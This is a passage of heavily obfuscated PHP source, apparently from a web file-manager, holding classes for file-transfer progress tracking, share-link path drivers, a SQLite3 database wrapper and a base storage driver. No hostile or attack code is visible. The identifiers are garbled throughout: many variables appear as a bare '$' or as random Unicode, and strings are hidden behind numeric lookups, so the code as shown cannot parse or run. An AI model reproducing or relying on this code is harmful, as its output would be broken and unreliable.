=> $, $Ҋ[426] => $۝ş); $ = $Ҋ[1732]; CacheLock::lock($); Model($Ҋ[496])->add($Č, array(), !0); CacheLock::unlock($); } public static function log($) { if (!GLOBAL_DEBUG) { return; } write_log($, $_SERVER[ʯ][1733]); } } class TaskFileTransfer extends Task { protected function startAfter() { $򭼓 =& $_SERVER[ʯ]; $ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($򭼓[1734], array($this, $򭼓[1735])); Hook::bind($򭼓[1284], array($this, $򭼓[1736])); Hook::bind($򭼓[1737], array($this, $򭼓[1738])); Hook::bind($򭼓[644], array($this, $򭼓[1739])); Hook::bind($򭼓[645], array($this, $򭼓[1740])); Hook::bind($򭼓[652], array($this, $򭼓[1741])); Hook::bind($򭼓[653], array($this, $򭼓[1742])); Hook::bind($򭼓[647], array($this, $򭼓[1743])); Hook::bind($򭼓[650], array($this, $򭼓[1744])); Hook::bind($򭼓[613], array($this, $򭼓[1745])); Hook::bind($򭼓[610], array($this, $򭼓[1745])); Hook::bind($򭼓[615], array($this, $򭼓[1745])); Hook::bind($򭼓[617], array($this, $򭼓[1745])); Hook::bind($򭼓[619], array($this, $򭼓[1745])); Hook::bind($򭼓[1746], array($this, $򭼓[1747])); Hook::bind($򭼓[635], array($this, $򭼓[1748])); $this->sourceModelCopyFlag = !1; Hook::bind($򭼓[1749], array($this, $򭼓[1750])); Hook::bind($򭼓[1751], array($this, $򭼓[1752])); Hook::bind($򭼓[1753], array($this, $򭼓[1754])); $[$򭼓[1755]] = LNG($򭼓[1756]); $[$򭼓[1757]] = 0; $[$򭼓[1758]] = 0; $[$򭼓[1125]] = $򭼓[12]; $[$򭼓[1759]] = $򭼓[12]; $[$򭼓[1760]] = 0; $[$򭼓[1761]] = 0; $[$򭼓[1762]] = 0; if (!$[$򭼓[1601]]) { $[$򭼓[1601]] = LNG($򭼓[1763]); } } protected function endAfter() { $Ғ =& $_SERVER[ʯ]; Hook::unbind($Ғ[1734], array($this, $Ғ[1735])); Hook::unbind($Ғ[1284], array($this, $Ғ[1736])); Hook::unbind($Ғ[1737], array($this, $Ғ[1738])); Hook::unbind($Ғ[644], array($this, $Ғ[1739])); Hook::unbind($Ғ[645], array($this, $Ғ[1740])); Hook::unbind($Ғ[652], array($this, $Ғ[1741])); Hook::unbind($Ғ[653], array($this, $Ғ[1742])); Hook::unbind($Ғ[647], array($this, $Ғ[1743])); Hook::unbind($Ғ[650], array($this, $Ғ[1744])); Hook::unbind($Ғ[613], array($this, $Ғ[1745])); Hook::unbind($Ғ[610], array($this, $Ғ[1745])); Hook::unbind($Ғ[615], array($this, $Ғ[1745])); Hook::unbind($Ғ[617], array($this, $Ғ[1745])); Hook::unbind($Ғ[619], array($this, $Ғ[1745])); Hook::unbind($Ғ[1746], array($this, $Ғ[1747])); Hook::unbind($Ғ[635], array($this, $Ғ[1748])); Hook::unbind($Ғ[1749], array($this, $Ғ[1750])); Hook::unbind($Ғ[1751], array($this, $Ғ[1752])); Hook::unbind($Ғ[1753], array($this, $Ғ[1754])); } public function copyMoveStart($侩, $Ü, $, $) { $ɶ =& $_SERVER[ʯ]; self::log($ɶ[1764] . $Ü . $ɶ[80] . $); $Ƀ = rtrim(TEMP_FILES, $ɶ[8]); if (substr($Ü, 0, strlen($Ƀ)) == $Ƀ) { return; } if (substr($, 0, strlen($Ƀ)) == $Ƀ) { return; } $ =& $this->task; $[$ɶ[1765]] = KodIO::transferType($侩, $); $this->update(); } public function updateAfter() { $Ȥ =& $_SERVER[ʯ]; $妑 =& $this->task; if (!$妑[$Ȥ[823]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($妑[$Ȥ[1765]] == $Ȥ[1376]) { return; } self::updateTask($妑); } private static function updateTask(&$г) { $ =& $_SERVER[ʯ]; if ($г[$[1765]] == $[1255] || $г[$[1765]] == $[117]) { if ($г[$[1759]]) { $г[$[1762]] = $г[$[1761]] + $г[$[1758]]; } } else { if ($г[$[1765]] == $[1377]) { if ($г[$[1759]] == $[1255]) { $г[$[1762]] = $г[$[1761]] + $г[$[1758]] * 0.5; } else { if ($г[$[1759]] == $[117]) { $г[$[1762]] = $г[$[1761]] + $г[$[1757]] * 0.5 + $г[$[1758]] * 0.5; } } } } $г[$[1706]] = $г[$[1762]] / $г[$[823]]; if ($г[$[1706]] > 0) { $ = timeFloat() - $г[$[1708]] - $г[$[1711]]; $г[$[1712]] = $ * (1 - $г[$[1706]]) / $г[$[1706]]; } } public function addPath($զ) { $ =& $_SERVER[ʯ]; if (!$զ) { return; } $ =& $this->task; $ƍ = IO::infoWithChildren($զ); $ = $[$[1766]] ? $[$[1766]][$[1767]] : 0; $[$[1766]] = array($[1767] => $ + 1, $[470] => $ƍ[$[42]], $[94] => $ƍ[$[94]], $[559] => $ƍ[$[559]] ? $ƍ[$[559]] : $ƍ[$[94]]); if ($ƍ[$[43]] == $[223]) { $[$[846]] += 1; } else { $[$[846]] += $ƍ[$[89]][$[87]]; if ($ƍ[$[190]]) { $[$[846]] += $ƍ[$[89]][$[88]] + 1; } } $[$[823]] += $ƍ[$[86]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($) { } public function sourceAddHashEnd($ل詭) { } public function sourceAddFileStart($Ԡ˭) { $ =& $_SERVER[ʯ]; $ =& $this->task; $[$[1757]] = $Ԡ˭[$[86]]; $[$[1755]] = $Ԡ˭[$[42]]; $[$[1125]] = $Ԡ˭[$[42]]; $[$[1768]] = $Ԡ˭[$[94]]; $this->update(); } public function sourceAddFileEnd($) { $ԪȊ =& $_SERVER[ʯ]; $륥 =& $this->task; $륥[$ԪȊ[1762]] += $[$ԪȊ[86]]; $륥[$ԪȊ[1768]] = $[$ԪȊ[94]]; $this->update(1); } public function copyFileStart($Ǭ, $, $Ϗπ, $, $, $) { $ݛ =& $_SERVER[ʯ]; $夺 = $; if ($夺 == $GLOBALS[$ݛ[1769]]) { $夺 = $GLOBALS[$ݛ[1770]]; } $GLOBALS[$ݛ[1770]] = $; $GLOBALS[$ݛ[1769]] = $; $؆ =& $this->task; $؆[$ݛ[1755]] = $夺; $؆[$ݛ[1757]] = (int) $Ǭ->size($); $؆[$ݛ[1758]] = 0; $؆[$ݛ[1125]] = $ݛ[12]; $؆[$ݛ[1759]] = $ݛ[12]; $؆[$ݛ[1760]] = 0; $鳔 = $؆[$ݛ[1757]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($؆[$ݛ[451]] . $ݛ[1771]); if ($鳔 && file_exists(get_path_father($))) { Cache::set($؆[$ݛ[451]] . $ݛ[1771], $); $؆[$ݛ[1728]] = array($ݛ[1772], $ݛ[1773]); } $this->update(0, $鳔); } public static function updateCopyLocalFileSize($Ǐ) { $ٗ =& $_SERVER[ʯ]; $ = Cache::get($Ǐ[$ٗ[451]] . $ٗ[1771]); if (!$ || !file_exists($)) { return $Ǐ; } $Ǐ[$ٗ[1758]] = @filesize($); $Ǐ[$ٗ[1762]] += $Ǐ[$ٗ[1758]]; self::updateTask($Ǐ); return $Ǐ; } public function copyFileEnd($, $ɾ, $֮ȧ, $釔, $Ҫ, $Ԉ) { $ =& $_SERVER[ʯ]; $ =& $this->task; $[$[1758]] = $[$[1757]]; $[$[1759]] = $[12]; unset($[$[1728]]); if ($Ҫ == $[$[1755]]) { $[$[1761]] += $[$[1757]]; $[$[1762]] = $[$[1761]]; $ = 1; if (isset($[$[1768]]) && $[$[1768]] == $ɾ) { $ = 0; } $this->update($); } else { $this->update(); $[$[1758]] = 0; } Cache::remove($[$[451]] . $[1771]); self::log($[1774] . $ɾ . $[80] . $釔 . $[18] . $Ҫ . $[1775] . $[$[1755]]); } public function updateFileEnd($糁, $Τ) { $ =& $_SERVER[ʯ]; $Ǥ =& $this->task; $Ǥ[$[1755]] = $糁; $Ǥ[$[1757]] = $Τ; $Ǥ[$[1761]] += $Τ; $Ǥ[$[1762]] = $Ǥ[$[1761]]; $this->update(1); self::log($[1776] . $糁); } public function sourceModelCopy($ؚ) { $ˀ =& $_SERVER[ʯ]; $ڦ = $ؚ[0]; $ = $ؚ[1]; $Ժ =& $this->task; $this->sourceModelCopyFlag = !0; $Ѫ = 0; switch ($ڦ) { case $ˀ[611]: $Ѫ = 1; break; case $ˀ[614]: $Ժ[$ˀ[1755]] = $[$ˀ[42]]; break; case $ˀ[616]: $Ѫ = intval($ؚ[$ˀ[432]] * 0.4); break; case $ˀ[618]: $Ѫ = intval($ؚ[$ˀ[432]] * 0.2); break; case $ˀ[620]: $Ѫ = intval($ؚ[$ˀ[432]] * 0.4); break; } $this->update($Ѫ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ʥ, $) { $ =& $_SERVER[ʯ]; $this->sourceModelCopyFlag = !0; $ = 1; if (isset($ʥ[$[89]])) { $ = $ʥ[$[89]][$[87]]; $ = $ + $ʥ[$[89]][$[88]] + 1; } $this->update($); $this->sourceModelCopyFlag = !1; } public function sourceMove($Χ) { $this->sourceRemove($Χ, !1); } public function curlProgress($, $, $Ŝ, $, $ʂ) { $ =& $_SERVER[ʯ]; $ =& $this->task; if ($ʂ > 0) { $[$[1125]] = $[1777]; $[$[1759]] = $[117]; if ($[$[1757]]) { $[$[1758]] = $ʂ; } if ($[$[1760]]) { $[$[1758]] = $ʂ + $[$[1760]]; } } else { if ($Ŝ > 0) { if ($[$[1757]] == $) { $[$[1758]] = $Ŝ; $[$[1125]] = $[1778]; $[$[1759]] = $[1255]; } } } $this->update(); } public function curlProgressStart($Ѥ) { } public function curlProgressEnd($) { $ᵚ =& $_SERVER[ʯ]; $ =& $this->task; $߆ = curl_getinfo($); $飨頾 = $߆[$ᵚ[1779]]; if ($飨頾 == -1) { $飨頾 = $߆[$ᵚ[1780]]; } if ($[$ᵚ[1759]] == $ᵚ[117] && $飨頾) { $[$ᵚ[1760]] += $飨頾; } $this->update(); } } goto CɎ; BކǑ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($) { $this->pathParse = $; $this->model = Model($_SERVER[ʯ][1393]); } public function getPathOuter($) { $к =& $_SERVER[ʯ]; if (!$) { return $; } $̚ = $this->parse($); return trim(KodIO::makeShare($this->pathParse[$к[451]], $̚[$к[451]]), $к[8]); } protected function infoParse($, $ = false, $߇қ = false) { $ =& $_SERVER[ʯ]; $¸ = $this->pathParse[$[451]]; $﮳ = trim($this->pathParse[$[1229]], $[8]); return Action($[1400])->sharePathInfo($¸, $﮳, $); } public function infoFull($줯) { $ =& $_SERVER[ʯ]; $ = explode($[8], trim($줯, $[8])); if (count($) > 1) { $ᗷ = implode($[8], array_splice($, 1)); $ګ = $this->model->pathInfoByPath($[0], $ᗷ); if (!$ګ) { return !1; } $this->pathParse[$[1229]] = $ګ[$[190]]; } return $this->infoParse($줯); } public function listAll($) { $Ң =& $_SERVER[ʯ]; $ = IO::info($this->pathParse[$Ң[94]]); if (!$) { return array(); } $ᛧ = $this->model->listAll($); $݌ = Model($Ң[640])->getInfo($[$Ң[641]]); foreach ($ᛧ as &$°) { check_abort(); $°[$Ң[97]] = Action($Ң[1400])->_shareItemeParse($°[$Ң[97]], $݌); } unset($°); return $ᛧ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($) { $this->pathParse = $; $this->model = Model($_SERVER[ʯ][1393]); } protected function infoParse($, $ = false, $惝 = false) { $ =& $_SERVER[ʯ]; return Action($[1235])->sharePathInfo($this->pathParse[$[94]], !0, $); } public function listPath($؝, $ = false) { $ =& $_SERVER[ʯ]; $љ = parent::listPath($؝, $); if (!$љ) { return $љ; } if (is_array($љ[$[1401]])) { $љ[$[1401]] = Action($[1235])->shareItemInfo($љ[$[1401]]); } foreach ($љ as $ => $Ṅ) { if (!in_array($, array($[93], $[92]))) { continue; } foreach ($Ṅ as $Ģ => $ԛ) { $љ[$][$Ģ] = Action($[1235])->shareItemInfo($ԛ); } } return $љ; } public function listAll($󿃥) { $є֨ =& $_SERVER[ʯ]; $ڐ = IO::info($this->pathParse[$є֨[94]]); if (!$ڐ) { return array(); } $춺 = $this->model->listAll($󿃥); foreach ($춺 as &$) { $[$є֨[97]] = Action($є֨[1235])->shareItemInfo($[$є֨[97]]); } unset($); return $춺; } } class PathDriverDriverShareItem { public function __construct($ϯ) { $this->pathParse = $ϯ; } public function __call($, $̮) { $е =& $_SERVER[ʯ]; if (method_exists($this, $)) { return; } $숒 = call_user_func_array(array($е[1402], $), $̮); $ = array($е[1403], $е[1404], $е[1405], $е[1406], $е[594], $е[596], $е[1407], $е[117], $е[1408], $е[1409]); if (in_array($, $)) { $숒 = $this->getPathOuter($숒); } return $숒; } public function copy($ȹě, $śɕ, $뒳ʌ = false, $Ť = false) { return $this->copyMove($ȹě, $śɕ, $뒳ʌ, $_SERVER[ʯ][594], $Ť); } public function move($, $ҍ, $ = false, $ = false) { return $this->copyMove($, $ҍ, $, $_SERVER[ʯ][596], $); } private function copyMove($, $湎, $Ō, $犘, $ = false) { $ =& $_SERVER[ʯ]; $ = $湎; $Ц璓 = IO::driverMake($湎); if ($Ц璓->pathParse[$[1212]]) { $湎 = $Ц璓->pathParse[$[1212]]; } else { $湎 = $; } $х = IO::copyMove($, $湎, $Ō, $犘, $); $х = $this->getPathOuter($х); return $х; } public function pathThis($姫) { return get_path_this($this->pathParse[$_SERVER[ʯ][94]]); } public function pathFather($ϑ) { return get_path_father($this->pathParse[$_SERVER[ʯ][94]]); } public function iconvSystem($ĥ) { return $ĥ; } protected function infoParse($䥞, $𬚚 = false) { $숺 =& $_SERVER[ʯ]; $ = $this->pathParse[$숺[536]][$숺[1236]] . $this->pathParse[$숺[1229]]; if ($𬚚) { $怀 = IO::infoWithChildren($); } else { $怀 = IO::info($); } $ = $this->pathParse[$숺[536]]; return Action($숺[1400])->_shareItemeParse($怀, $); } public function listAll($وׂ) { $ٮ =& $_SERVER[ʯ]; $ = IO::listAll($وׂ); $ة = rtrim($this->pathParse[$ٮ[536]][$ٮ[1236]], $ٮ[8]); foreach ($ as &$С) { $С[$ٮ[94]] = $this->pathDriver . $ٮ[8] . ltrim(substr($С[$ٮ[94]], strlen($ة)), $ٮ[8]); } unset($С); return $; } public function listAllSimple($, $ = false) { $ℚ =& $_SERVER[ʯ]; $挧 = $this->listAll($); $ = $this->pathParse[$ℚ[471]]; if (trim($, $ℚ[8]) == trim(get_path_father($), $ℚ[8])) { $ = !0; } return IO::init($ℚ[12])->listAllSimpleMake($挧, $, $); } public function getPathOuter($칏) { $ۊ =& $_SERVER[ʯ]; $ = KodIO::parse($칏); if ($[$ۊ[43]] == KodIO::KOD_SHARE_ITEM) { return $[$ۊ[94]]; } $ = KodIO::clear($칏); $α = KodIO::clear($this->pathParse[$ۊ[536]][$ۊ[1236]]); $ = substr($, strlen($α)); if (substr($, 0, strlen($α)) != $α) { return !1; } return $this->pathParse[$ۊ[1230]] . $ۊ[8] . ltrim($, $ۊ[8]); } public function getType() { $ښ¾ =& $_SERVER[ʯ]; $ = str_replace($ښ¾[84], $ښ¾[12], get_class($this)); return strtolower($); } public function isTypeObject($ט) { return IO::isTypeObject($ט); } public function info($) { return $this->infoParse($); } public function infoAuth($碬) { return $this->infoParse($碬); } public function infoWithChildren($ǧ) { return $this->infoParse($ǧ, !0); } public function infoFull($焥) { return $this->infoParse($焥); } } goto A勄; c: class DbSqlite3Base extends Db { public function __construct($踍 = '') { $ =& $_SERVER[ʯ]; if (!class_exists($[64])) { think_exception(think_lang($[24]) . $[65]); } if (!empty($踍)) { if (!isset($踍[$[26]])) { $踍[$[26]] = 438; } $this->config = $踍; if (empty($this->config[$[27]])) { $this->config[$[27]] = array(); } } } public function connect($ = '', $Ӻ = 0) { $܂ =& $_SERVER[ʯ]; if (!isset($this->linkID[$Ӻ])) { if (empty($)) { $ = $this->config; } $this->linkID[$Ӻ] = new SQLite3($[$܂[31]]); if (!$this->linkID[$Ӻ]) { think_exception($this->linkID[$Ӻ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Ӻ]->busyTimeout(30000); if (1 != think_config($܂[32])) { unset($this->config); } } return $this->linkID[$Ӻ]; } public function free() { $this->queryID = null; } public function query($) { $ᾱ =& $_SERVER[ʯ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($ᾱ[33], 1); think_status($ᾱ[34]); $this->queryID = $this->_linkID->query($); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ʜ = $this->getAll(); $this->numRows = count($ʜ); return $ʜ; } } public function execute($鈍) { $쎒 =& $_SERVER[ʯ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $鈍; if ($this->queryID) { $this->free(); } think_action_status($쎒[35], 1); think_status($쎒[34]); $Հը = $this->_linkID->exec($鈍); $this->debug(); if (!1 === $Հը) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ʯ][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $̶ = $this->_linkID->query($_SERVER[ʯ][37]); if (!$̶) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ = $this->_linkID->query($_SERVER[ʯ][38]); if (!$) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $І = array(); while ($ُ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $І[] = $ُ; } $this->queryID->reset(); return $І; } public function getFields($) { $ =& $_SERVER[ʯ]; $ǂ = $this->query($[39] . $ . $[40]); $Φ = array(); if ($ǂ) { foreach ($ǂ as $𖉎 => $) { $Φ[$[$[42]]] = array($[42] => $[$[42]], $[43] => $[$[43]], $[45] => (bool) ($[$[45]] === $[12]), $[47] => $[$[66]], $[49] => (bool) $[$[67]], $[52] => (bool) $[$[67]]); } } return $Φ; } public function getTables($ = '') { $ =& $_SERVER[ʯ]; $ĕ = $this->query($[55] . $[56] . $[57]); $޹ = array(); foreach ($ĕ as $ => $) { $޹[$] = current($); } return $޹; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ç =& $_SERVER[ʯ]; $this->error = $this->_linkID->lastErrorMsg(); if ($ç[12] != $this->queryStr) { $this->error .= LNG($ç[58]) . $this->queryStr; } think_trace($this->error, $ç[12], $ç[59]); return $this->error; } public function escapeString($̖) { $ =& $_SERVER[ʯ]; if ($this->_linkID) { return $this->_linkID->escapeString($̖); } return str_ireplace($[68], $[69], $̖); } public function parseLimit($Ϡ) { $ߒ =& $_SERVER[ʯ]; $Ꭼ = $ߒ[12]; if (!empty($Ϡ)) { $Ϡ = explode($ߒ[60], $Ϡ); if (count($Ϡ) > 1) { $Ꭼ .= $ߒ[61] . $Ϡ[1] . $ߒ[62] . $Ϡ[0] . $ߒ[63]; } else { $Ꭼ .= $ߒ[61] . $Ϡ[0] . $ߒ[63]; } } return $Ꭼ; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ӑ =& $_SERVER[ʯ]; $this->objectDriver = array($ӑ[70], $ӑ[71], $ӑ[72], $ӑ[73], $ӑ[74], $ӑ[75], $ӑ[76], $ӑ[77], $ӑ[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($, $_SERVER[ʯ][8]); } return $; } public function iconvApp($賦) { return $賦; } public function iconvSystem($«) { return $«; } public function iconvTo($, $ۧ, $) { $ =& $_SERVER[ʯ]; if (!$ || !function_exists($[79])) { return $; } static $ښ = array(); $׸ = $ۧ . $[80] . $ . $[81] . $; if (isset($ښ[$׸])) { return $ښ[$׸]; } if (function_exists($[82])) { $Ԁ˅ = @mb_convert_encoding($, $, $ۧ); } else { $Ԁ˅ = @iconv($ۧ, $, $); } $Ԁ˅ = $Ԁ˅ ? $Ԁ˅ : $; if (strstr($Ԁ˅, $[83])) { $Ԁ˅ = str_replace($[83], $[11], $Ԁ˅); } $ښ[$ۧ . $[80] . $ . $[81] . $] = $Ԁ˅; $ښ[$ . $[80] . $ۧ . $[81] . $] = $; $ښ[$ . $[80] . $ۧ . $[81] . $Ԁ˅] = $; $ښ[$ۧ . $[80] . $ . $[81] . $Ԁ˅] = $Ԁ˅; return $Ԁ˅; } public function getPathInner($ėۄ) { $ = IO::init($ėۄ); return $->path; } public function getPathOuter($ᨣ) { $ފ =& $_SERVER[ʯ]; $ɞ = strlen(trim($this->pathBase, $ފ[8])); $ᨣ = substr(trim($ᨣ, $ފ[8]), $ɞ); return $this->pathDriver . $ފ[8] . ltrim($ᨣ, $ފ[8]); } public function isParentOf($ힱ, $ՇԿ) { $ =& $_SERVER[ʯ]; $ힱ = rtrim(strtolower($ힱ), $[8]) . $[8]; $ՇԿ = rtrim(strtolower($ՇԿ), $[8]) . $[8]; $ߞ = strpos($ՇԿ, $ힱ) === 0; return $ߞ; } public function getType() { $ =& $_SERVER[ʯ]; $Ώ = str_replace($[84], $[12], get_class($this)); return strtolower($Ώ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($, $Ǩ) { $ =& $_SERVER[ʯ]; $򽂌 = rtrim($, $[8]) . $[8] . $Ǩ; $ᢝ = $this->exist($򽂌); return $ᢝ ? $򽂌 : !1; } public function setModifyTime($, $ꏰ = '') { } public function renameObject($, $Ⲗ) { $ޙҙ = $Ⲗ; $ = $this->getPathOuter($); $Ⲗ = $this->pathFather($) . $Ⲗ; $ϔ = IO::copy($, $this->pathFather($), REPEAT_RENAME_FOLDER, $ޙҙ); if ($ϔ) { IO::remove($); } return $ϔ ? $Ⲗ : !1; } public function tempFile($ˡ = '', $չ = '') { if (!$ˡ) { $ˡ = rand_string(15); } $ﳺ = TEMP_FILES . rand_string(15) . $_SERVER[ʯ][8]; @mkdir($ﳺ, DEFAULT_PERRMISSIONS, !0); $쫀 = $ﳺ . $ˡ; @touch($쫀); if ($չ) { file_put_contents($쫀, $չ); } return $쫀; } public function tempFileRemve($䵏) { @unlink($䵏); @rmdir($this->pathFather($䵏)); } public function mkfile($҄, $伍 = '', $ = REPEAT_RENAME) { } public function mkdir($מ, $ = REPEAT_SKIP) { } public function delFile($Ɨ) { } public function delFolder($ͣ͠) { } public function copyFile($, $) { } public function moveFile($آ, $ѽ) { } public function remove($) { if ($this->isFile($)) { return $this->delFile($); } return $this->delFolder($); } public function rename($ë, $) { } public function exist($ݩ) { } public function findByHash($֚ش = '', $Ӏ = '') { return !1; } public function isFile($֣) { } public function isFolder($Ԋ) { } public function size($ڕ) { } public function info($֞) { } public function infoSimple($) { return $this->info($); } public function infoAuth($یݚ) { return $this->info($یݚ); } public function infoFull($͆) { return $this->info($͆); } public function infoFullSimple($Ң) { return $this->info($Ң); } public function infoWithChildren($ݥ) { $ =& $_SERVER[ʯ]; static $Ŏ崀 = array(); if (isset($Ŏ崀[$ݥ])) { return $Ŏ崀[$ݥ]; } $쐪 = $this->info($ݥ); if ($쐪 && $쐪[$[43]] == $[85]) { $ħ = array($[86] => 0, $[87] => 0, $[88] => 0); $this->infoChildren($ݥ, $ħ); $쐪[$[86]] = $ħ[$[86]]; $쐪[$[89]] = array($[90] => $ħ[$[87]], $[91] => $ħ[$[88]]); $Ŏ崀[$ݥ] = $쐪; } return $쐪; } public function listPath($ڒ, $ = false) { } public function has($ɫ, $ˇ = false, $Ώ = false) { } public function canRead($) { } public function canWrite($) { } public function getContent($) { } public function setContent($ݒ, $̈ʗ = '') { } protected function infoChildren($௢, &$) { $쉩 =& $_SERVER[ʯ]; check_abort_echo(); $ = $this->listPath($௢, !0); $ = array_merge($[$쉩[92]], $[$쉩[93]]); foreach ($ as $) { if ($[$쉩[43]] == $쉩[85]) { $[$쉩[88]]++; $ةЙ = $this->getPathInner($[$쉩[94]]); $this->infoChildren($ةЙ, $); } else { $[$쉩[87]]++; $[$쉩[86]] += $[$쉩[86]]; } } } public function fileSubstr($ߥ, $إ, $) { } public function listAll($) { } public function listAllMake($ݔ, &$) { $ =& $_SERVER[ʯ]; check_abort_echo(); $ = $this->listPath($ݔ, !0); if (!$) { return; } $ߋÖ = array_merge($[$[92]], $[$[93]]); foreach ($ߋÖ as $Ԓ) { $ = $Ԓ[$[43]] == $[85]; $ = array($[94] => $Ԓ[$[94]], $[85] => $); if (isset($Ԓ[$[86]])) { $[$[86]] = $Ԓ[$[86]]; } if (isset($Ԓ[$[95]])) { $[$[95]] = $Ԓ[$[95]]; } if (!$) { $[] = $; continue; } $[] = $; $ը = $Ԓ[$[94]]; $ = $this->pathDriver; if (substr($Ԓ[$[94]], 0, strlen($)) == $) { $ը = substr($ը, strlen($)); } $this->listAllMake($ը, $); } } public function listAllSimple($, $ = false) { $Ǯ = $this->listAll($); return $this->listAllSimpleMake($Ǯ, $this->getPathOuter($), $); } public function listAllSimpleMake($, $ق, $۪) { $󁃈 =& $_SERVER[ʯ]; $Ö = array(); $ق = rtrim(get_path_father($ق), $󁃈[8]) . $󁃈[8]; foreach ($ as $) { $Ûݯ = array($󁃈[94] => $[$󁃈[94]], $󁃈[96] => $[$󁃈[94]], $󁃈[85] => $[$󁃈[85]]); if (isset($[$󁃈[86]]) && !$[$󁃈[85]]) { $Ûݯ[$󁃈[86]] = $[$󁃈[86]]; } if (isset($[$󁃈[95]])) { $Ûݯ[$󁃈[95]] = $[$󁃈[95]]; } if (is_array($[$󁃈[97]])) { $Ûݯ[$󁃈[96]] = $[$󁃈[97]][$󁃈[94]]; $Ûݯ[$󁃈[86]] = $[$󁃈[97]][$󁃈[86]]; $Ûݯ[$󁃈[95]] = $[$󁃈[97]][$󁃈[95]]; } else { if (substr($[$󁃈[94]], 0, strlen($ق)) == $ق) { $Ûݯ[$󁃈[94]] = substr($[$󁃈[94]], strlen($ق)); } } $ = $[$󁃈[85]] ? $󁃈[8] : $󁃈[12]; $Ûݯ[$󁃈[96]] = rtrim($Ûݯ[$󁃈[96]], $󁃈[8]) . $; $Ûݯ[$󁃈[94]] = $󁃈[8] . trim($Ûݯ[$󁃈[94]], $󁃈[8]) . $; if (!$۪) { $ = explode($󁃈[8], trim($Ûݯ[$󁃈[94]], $󁃈[8])); $Ûݯ[$󁃈[94]] = $󁃈[8] . implode($󁃈[8], array_slice($, 1)) . $; } $Ö[] = $Ûݯ; } return array_sort_by($Ö, $󁃈[94]); } public function upload($, $Ρ, $݆ = false, $ഝƢ = REPEAT_REPLACE) { } public function uploadFileByID($Ǖ, $ϊ, $) { } public function uploadFileByPath($, $, $ڧғ = array()) { } public function isUploadServer() { $ =& $_SERVER[ʯ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $[98]) { return !0; } return $GLOBALS[$[6]][$[99]][$[100]]; } public function isFileOutServer() { $ =& $_SERVER[ʯ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $[98]) { return !0; } return $GLOBALS[$[6]][$[99]][$[101]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ۯ) { $ =& $_SERVER[ʯ]; if (!$this->isCdnHost()) { return $ۯ; } return str_replace(trim(get_url_root($ۯ), $[8]), trim($this->cdnHost, $[8]), $ۯ); } public function uploadLink($, $ؒ = 0) { $Κ =& $_SERVER[ʯ]; if ($this->isUploadServer()) { return; } $ኗ = $this->getType(); if (!in_array($ኗ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ޝ = 1024 * 1024 * 10; $Ԇۣ = $ؒ <= $ޝ ? $Κ[102] : $Κ[103]; $ͻ = (!$ؒ ? 1 : ceil($ؒ / pow(1024, 3))) * 3600 * 4; $ = $this->{$Ԇۣ}($, $ͻ); if ($) { $[$Κ[104]] = $; $[$Κ[105]] = $ኗ; } return $; } public function uploadFormData($Ρ҃, $ = 3600) { } public function multiUploadFormData($ĵ, $ѧ = 3600) { } public function download($ᝁ, $֋֚) { } public function ext($) { $ =& $_SERVER[ʯ]; if (strpos($, $[8]) === -1) { $Ĕ = $; } else { $Ĕ = $this->pathThis($); } $鞯 = $[12]; if (strstr($Ĕ, $[10])) { $鞯 = substr($Ĕ, strrpos($Ĕ, $[10]) + 1); $鞯 = strtolower($鞯); } if (strlen($鞯) > 3 && preg_match($[106], $鞯, $)) { $鞯 = $[12]; } return $鞯; } public function pathThis($᪬) { $ =& $_SERVER[ʯ]; $᪬ = str_replace($[107], $[8], rtrim($᪬, $[8])); $ = strrpos($᪬, $[8]); if ($ === !1) { return $᪬; } return substr($᪬, $ + 1); } public function pathFather($) { $ =& $_SERVER[ʯ]; $ = str_replace($[107], $[8], rtrim($, $[8])); $ = strrpos($, $[8]); if ($ === !1) { return $[12]; } return substr($, 0, $ + 1); } public function hashSimple($̓) { $ =& $_SERVER[ʯ]; if (!$̓) { return md5($[12]); } $т = $this->size($̓); $̻ = 200; $ퟞ = 50; if ($т <= $̻ * $ퟞ) { return $this->hashMd5($̓) . $т; } $ = intval($т / $ퟞ); $Շ = $[12]; for ($װ = 0; $װ < $ퟞ; $װ++) { $Շ .= $this->fileSubstr($̓, $ * $װ, $̻); } $Շ .= $this->fileSubstr($̓, $т - $̻, $̻); return md5($Շ) . $т; } public static $md5Cache = array(); public function hashMd5($֨) { if (!$֨) { return md5($_SERVER[ʯ][12]); } $֨ = $this->iconvSystem($֨); if (isset(self::$md5Cache[$֨])) { return self::$md5Cache[$֨]; } self::$md5Cache[$֨] = $this->hashMd5Shell($֨); 